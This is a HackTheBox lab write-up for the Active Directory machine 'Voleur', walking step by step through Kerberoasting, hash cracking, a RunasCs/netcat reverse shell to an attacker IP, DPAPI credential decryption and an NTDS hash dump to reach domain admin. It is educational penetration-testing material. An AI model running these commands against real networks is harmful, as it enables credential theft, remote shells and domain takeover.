# HackTheBox Write-Up: Voleur

> **Difficulty:** Windows / Active Directory  
> **Tags:** `Active Directory` `Kerberos` `BloodHound` `DPAPI` `WSL` `Kerberoasting`

---

## Introduction

Hack The Box's **Voleur** is a Windows machine that takes us through an Active Directory environment across multiple stages: enumeration, initial foothold, lateral movement, and privilege escalation.

In this walkthrough, I'll share my thought process, key steps, and lessons learned.

---

## Enumeration

### Nmap Scan

I started with an nmap scan of the target, confirmed it was a Domain Controller, and added the domain names to `/etc/hosts`. I also set it as the DNS server in Kali's network settings.

### LDAP Enumeration

```bash
ldapsearch -x -H ldap://10.10.11.76 -s base -b "" namingContexts
```

### Starting Credentials

We were given the following credentials:

```
ryan.naylor / HollowOct31Nyt
```

I confirmed these against the domain controller via LDAP.

> ⚠️ This DC is **Kerberos-only**, so the `-k` flag is required for most tools.

### BloodHound Collection

With valid domain user access, I used `bloodhound-python` to collect data and imported it into BloodHound:

```bash
bloodhound-python -u ryan.naylor -p 'HollowOct31Nyt' -k -d voleur.htb -ns 10.10.11.76 -c All --zip
```

The graph showed **no outbound edges** for Ryan, so I shifted focus to SMB.

### SMB Enumeration

SMB access required Kerberos. I synchronized system time with the DC, requested a TGT, and enumerated shares:

```bash
sudo ntpdate dc.voleur.htb
impacket-getTGT voleur.htb/ryan.naylor:'HollowOct31Nyt'
export KRB5CCNAME=ryan.naylor.ccache
smbclient.py -k dc.voleur.htb
```

On the **IT share**, I found a **password-protected Excel file**.

---

## Initial Foothold

### Cracking the Excel File

The Excel file contained hashed protection. I extracted the hash and cracked it with John the Ripper:

```bash
office2john Access_Review.xlsx > excel_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt excel_hash.txt
```

This revealed credentials for:
- `svc_ldap`
- `svc_iis`
- `todd.wolfe` *(account is currently deleted — may need to restore later)*

### Targeted Kerberoasting

BloodHound showed `svc_ldap` had **WriteSPN** permissions over `svc_winrm`. I requested a TGT as `svc_ldap` and ran a targeted Kerberoast:

```bash
impacket-getTGT voleur.htb/svc_ldap:'<password>'
export KRB5CCNAME=svc_ldap.ccache
python3 targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb
```

This retrieved Kerberoastable hashes for `svc_winrm` and `lacey.miller`. Only `svc_winrm`'s hash cracked:

```bash
hashcat -m 13100 hash2.txt /usr/share/wordlists/rockyou.txt
```

### Shell via Evil-WinRM

```bash
sudo ntpdate dc.voleur.htb
impacket-getTGT voleur.htb/svc_winrm:'<password>'
export KRB5CCNAME=svc_winrm.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb
```

🏁 **User flag** retrieved from `svc_winrm`'s Desktop.

---

## Privilege Escalation

### Lateral Move: svc_ldap via RunasCS

With a shell as `svc_winrm`, I uploaded `RunasCs.exe` and `nc64.exe` to `C:\Temp` and got a reverse shell as `svc_ldap`:

```cmd
./RunasCs.exe svc_ldap <password> "cmd.exe /c c:\temp\nc64.exe 10.10.14.32 1239 -e cmd.exe" -d voleur.htb
```

### Restoring User todd.wolfe

Switched to PowerShell and restored the deleted AD account:

```powershell
$deletedUser = Get-ADObject -Filter 'sAMAccountName -eq "todd.wolfe"' -IncludeDeletedObjects
Restore-ADObject -Identity $deletedUser
```

Confirmed the account was valid and active.

### DPAPI Credential Decryption

While exploring `todd.wolfe`'s profile, I found a **DPAPI credential blob** inside:

```
AppData\Roaming\Microsoft\Credentials\
```

Alongside it, in the `Protect` folder, was a **master key**. Using the known password and `impacket-dpapi`, I decrypted the blob:

```bash
impacket-dpapi masterkey \
  -password <todd.wolfe password> \
  -sid S-1-5-21-3927696377-1337352550-2781715495-1110 \
  -file 08949382-134f-4c63-b93c-ce52efc0aa88

impacket-dpapi credential \
  -file 772275FAD58525253490A9B0039791D3 \
  -key <decrypted masterkey>
```

This yielded credentials for **jeremy.combs**.

### SSH via WSL — svc_backup

Checking `jeremy.combs`'s SMB share revealed:
- A note about a backup configured in **WSL**
- A **private SSH key** for `svc_backup`

Port 22 wasn't open on the DC, but port **2222** (a common alternate) worked:

```bash
ssh -i id_rsa svc_backup@dc.voleur.htb -p 2222
```

We landed inside a **WSL environment** with the C drive mounted at `/mnt`.

### Extracting NTDS

Inside `/mnt`, I located a backup folder readable by `svc_backup` containing:
- `ntds.dit`
- `SECURITY` registry hive
- `SYSTEM` registry hive

Transferred them via SCP and dumped hashes:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```

### Root Flag

Used the Administrator hash with Evil-WinRM to get the root flag:

```bash
evil-winrm -i dc.voleur.htb -r voleur.htb -u Administrator -H <hash>
```

🏁 **Root flag** retrieved!

---

## Attack Chain Summary

```
ryan.naylor (given creds)
    └─► SMB Enumeration → Excel file crack
            └─► svc_ldap + svc_winrm creds
                    └─► WriteSPN → Kerberoast → svc_winrm shell (User Flag)
                            └─► RunasCS → svc_ldap shell
                                    └─► Restore todd.wolfe
                                            └─► DPAPI blob → jeremy.combs creds
                                                    └─► SSH key → svc_backup (WSL)
                                                            └─► ntds.dit → Admin hash
                                                                    └─► Root Flag ✓
```

---

## Key Takeaways

- **Kerberos-only environments** require time sync and proper TGT management — always run `ntpdate` first.
- **WriteSPN** is a powerful ACL edge in AD — it enables targeted Kerberoasting without needing high privileges.
- **DPAPI blobs** in user profiles can store plaintext credentials; always check `AppData\Roaming\Microsoft\Credentials\`.
- **WSL** on Windows servers can expose the host filesystem — check `/mnt` for sensitive files.
- **Alternate SSH ports** (2222, 2022, etc.) are worth probing when 22 is closed.

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning |
| `bloodhound-python` | AD enumeration |
| `impacket-getTGT` | Kerberos TGT requests |
| `smbclient.py` | SMB share enumeration |
| `office2john` + `john` | Excel hash cracking |
| `targetedKerberoast.py` | Kerberoast with WriteSPN |
| `hashcat` | Hash cracking |
| `evil-winrm` | WinRM shell |
| `RunasCs.exe` | Run as different user |
| `impacket-dpapi` | DPAPI decryption |
| `impacket-secretsdump` | NTDS hash extraction |

---

*Disclaimer: This write-up is intended strictly for educational and ethical security research purposes. The techniques described are performed within the controlled, legal laboratory environment of Hack The Box to help cybersecurity professionals and students understand modern vulnerabilities and defensive remediation. I do not condone or encourage the use of these techniques for unauthorized or illegal activities.*
